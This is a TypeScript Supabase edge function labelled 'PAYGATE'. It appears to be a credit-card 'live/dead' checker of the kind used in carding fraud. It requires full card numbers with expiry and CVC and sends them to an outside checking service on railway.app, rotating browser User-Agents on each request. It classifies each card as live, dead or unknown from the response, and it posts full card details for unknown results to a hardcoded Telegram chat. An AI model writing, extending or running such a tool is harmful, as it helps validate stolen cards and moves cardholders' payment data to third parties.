import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_CHAT_ID = "8496943061";

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// Send admin debug notification for UNKNOWN results
const sendAdminDebug = async (cc: string, rawResponse: string, apiMessage: string): Promise<void> => {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log('[PAYGATE] No Telegram bot token - skipping admin debug');
    return;
  }

  try {
    const message = `🔍 <b>PAYGATE DEBUG - UNKNOWN</b>\n\n` +
      `💳 <b>Card:</b> <code>${cc}</code>\n\n` +
      `📋 <b>API Message:</b>\n<code>${apiMessage}</code>\n\n` +
      `📦 <b>Raw Response:</b>\n<pre>${rawResponse.substring(0, 1500)}</pre>`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
    console.log('[PAYGATE] Admin debug sent for UNKNOWN result');
  } catch (error) {
    console.error('[PAYGATE] Failed to send admin debug:', error);
  }
};

// Extract single key response message from API
const extractResponseMessage = (data: Record<string, unknown>): string => {
  // Priority: message > status > first meaningful field
  if (data?.message && typeof data.message === 'string') {
    return data.message;
  }
  if (data?.status && typeof data.status === 'string') {
    return data.status;
  }
  if (data?.error && typeof data.error === 'string') {
    return data.error;
  }
  if (data?.result && typeof data.result === 'string') {
    return data.result;
  }
  // Fallback to first string value found
  for (const key of Object.keys(data)) {
    if (typeof data[key] === 'string' && data[key]) {
      return data[key] as string;
    }
  }
  return 'No response message';
};

// Determine status from API response
const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" | "unknown" => {
  const rawResponse = JSON.stringify(data).toLowerCase();
  const status = (data?.status as string)?.toLowerCase() || '';
  const message = (data?.message as string)?.toLowerCase() || '';
  
  console.log('[PAYGATE] Analyzing response - status:', status, 'message:', message);
  
  // UNKNOWN: Check for API/gateway errors first (iframe, step, timeout, error, etc.)
  if (
    rawResponse.includes('iframe') ||
    rawResponse.includes('step') ||
    rawResponse.includes('timeout') ||
    rawResponse.includes('not found') ||
    rawResponse.includes('error') ||
    rawResponse.includes('exception') ||
    status === 'retry' ||
    rawResponse.includes('retry')
  ) {
    console.log('[PAYGATE] Detected API/Gateway error - marking as UNKNOWN');
    return "unknown";
  }
  
  // LIVE: Check for success, successful transaction, successfully transaction
  if (
    status === 'success' ||
    rawResponse.includes('success') ||
    rawResponse.includes('successful transaction') ||
    rawResponse.includes('successfully transaction') ||
    rawResponse.includes('successfully charged') ||
    rawResponse.includes('approved')
  ) {
    console.log('[PAYGATE] Detected LIVE status');
    return "live";
  }
  
  // DEAD: Check for declined, failed, rejected, verification, 3d, otp
  if (
    status === 'declined' ||
    status === 'failed' ||
    status === 'rejected' ||
    status === 'dead' ||
    rawResponse.includes('declined') ||
    rawResponse.includes('failed') ||
    rawResponse.includes('rejected') ||
    rawResponse.includes('verification') ||
    rawResponse.includes('3d') ||
    rawResponse.includes('otp') ||
    rawResponse.includes('insufficient') ||
    rawResponse.includes('invalid') ||
    rawResponse.includes('expired') ||
    rawResponse.includes('card was declined')
  ) {
    console.log('[PAYGATE] Detected DECLINED status');
    return "dead";
  }
  
  // Default to UNKNOWN for unrecognized responses
  console.log('[PAYGATE] Unrecognized response - marking as UNKNOWN');
  return "unknown";
};

// Perform API check - optimized for speed with proper error handling
const performCheck = async (cc: string, userAgent: string): Promise<Record<string, unknown>> => {
  const timestamp = Date.now();
  // Use HTTPS and proper URL format
  const apiUrl = `https://web-production-c8c87.up.railway.app/check?cc=${encodeURIComponent(cc)}&_t=${timestamp}`;
  
  console.log(`[PAYGATE] API call:`, apiUrl);

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 20000); // 20s timeout

  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      signal: controller.signal,
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
      }
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[PAYGATE] Raw response:`, rawText);

    // Handle empty response
    if (!rawText || rawText.trim() === '') {
      return {
        computedStatus: "unknown",
        responseMessage: "Empty response from API",
        apiStatus: "ERROR",
        apiMessage: "Empty response from API",
        rawResponse: "Empty response"
      };
    }

    let data: Record<string, unknown>;
    try {
      data = JSON.parse(rawText);
    } catch {
      // If not JSON, treat raw text as the response
      data = { raw: rawText, message: rawText, status: "UNKNOWN" };
    }

    const computedStatus = getStatusFromResponse(data);
    const responseMessage = extractResponseMessage(data);

    return {
      computedStatus,
      responseMessage,
      apiStatus: data.status || 'UNKNOWN',
      apiMessage: data.message || responseMessage,
      apiTotal: data.total || null,
      rawResponse: JSON.stringify(data)
    };
  } catch (error) {
    clearTimeout(timeoutId);
    const errorMsg = error instanceof Error ? error.message : "Unknown fetch error";
    console.error(`[PAYGATE] Fetch error:`, errorMsg);
    
    // Check for specific error types
    const isTimeout = errorMsg.includes('abort') || errorMsg.includes('timeout');
    const isConnectionReset = errorMsg.includes('reset') || errorMsg.includes('connection');
    
    return { 
      apiStatus: "ERROR",
      apiMessage: isTimeout ? "Request timeout" : isConnectionReset ? "Connection reset" : errorMsg,
      computedStatus: "unknown",
      responseMessage: isTimeout ? "Request timeout - try again" : isConnectionReset ? "Connection error - try again" : errorMsg,
      rawResponse: errorMsg
    };
  }
};

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // REQUIRE AUTHENTICATION
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // VERIFY USER TOKEN
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // CHECK USER IS NOT BANNED
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ error: 'Card data (cc) is required', computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Validate card format: CardNumber|MM|YY|CVC - CVC is MANDATORY
    const cardParts = cc.split('|');
    if (cardParts.length < 4) {
      return new Response(
        JSON.stringify({ error: "Invalid card format. Required: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const [cardNumber, mm, yy, cvc] = cardParts;
    
    // Validate CVC is present and valid (3-4 digits)
    if (!cvc || cvc.length < 3 || cvc.length > 4 || !/^\d+$/.test(cvc)) {
      return new Response(
        JSON.stringify({ error: "CVC is mandatory and must be 3-4 digits", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const userAgent = getRandomUserAgent();
    console.log('[PAYGATE] Checking card for user:', user.id);
    console.log('[PAYGATE] Using User-Agent:', userAgent);

    // Perform check with automatic retry for UNKNOWN responses
    const data = await performCheck(cc, userAgent);

    // Send admin debug for UNKNOWN results (fire-and-forget)
    if (data.computedStatus === "unknown") {
      sendAdminDebug(cc, data.rawResponse as string || '', data.apiMessage as string || '');
    }

    return new Response(
      JSON.stringify(data),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[PAYGATE] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ error: errorMessage, status: "ERROR", computedStatus: "unknown" }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
